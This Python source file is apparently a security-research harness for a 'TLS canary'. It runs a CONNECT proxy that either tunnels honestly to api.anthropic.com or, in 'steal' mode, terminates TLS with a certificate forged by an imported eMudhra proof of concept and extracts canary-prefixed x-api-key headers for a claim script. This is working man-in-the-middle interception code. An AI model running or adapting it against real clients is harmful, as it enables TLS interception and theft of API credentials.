"""The Mac side of the TLS canary: the CONNECT proxy the guest reaches at 192.168.127.254:<port>.

python3 tls_host.py <port> honest      # tunnel to api.anthropic.com:443
python3 tls_host.py <port> steal       # terminate TLS with an eMudhra-forged leaf; print K

steal reuses the #170 PoC (base-vm/browser-sandbox-v1/source/tests/test_emudhra_poc.py). With K,
contracts/canary_claim.py <attestation hex> <K> <claimant> <id> <canary> <chainid> builds the claim.
"""
import socket
import sys
import tempfile
import threading
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "base-vm/browser-sandbox-v1/source/tests"))
import test_emudhra_poc as poc  # noqa: E402

PREFIX = "sk-ant-canary-"


def pipe(a, b):
    while data := a.recv(65536):
        b.sendall(data)
    b.shutdown(socket.SHUT_WR)


def honest(port):
    srv = socket.create_server(("0.0.0.0", port))
    while True:
        conn, _ = srv.accept()
        f = conn.makefile("rb")
        assert f.readline().startswith(b"CONNECT api.anthropic.com:443 ")
        while f.readline() not in (b"\r\n", b""):
            pass
        up = socket.create_connection(("api.anthropic.com", 443))
        conn.sendall(b"HTTP/1.1 200 Connection established\r\n\r\n")
        for x, y in ((conn, up), (up, conn)):
            threading.Thread(target=pipe, args=(x, y), daemon=True).start()


def steal(port, tmp):
    """Start the forged-leaf proxy on port; returns it. Its .seen fills as the guest sends K."""
    _, cert, key = poc.forge(poc.HERE / "emudhra/g3b-chain.pem", Path(tmp))
    host = poc.Host(cert, key)
    host.sock.close()
    host.sock = socket.create_server(("0.0.0.0", port))
    host.port = host.sock.getsockname()[1]
    host.start()
    return host


def stolen(host):
    for s in host.seen:
        if s["headers"].get("x-api-key", "").startswith(PREFIX):
            return s["headers"]["x-api-key"][len(PREFIX):]


if __name__ == "__main__":
    port, mode = int(sys.argv[1]), sys.argv[2]
    if mode == "honest":
        honest(port)
    with tempfile.TemporaryDirectory() as t:
        host = steal(port, t)
        while (k := stolen(host)) is None:
            time.sleep(1)
        print("K", k, flush=True)
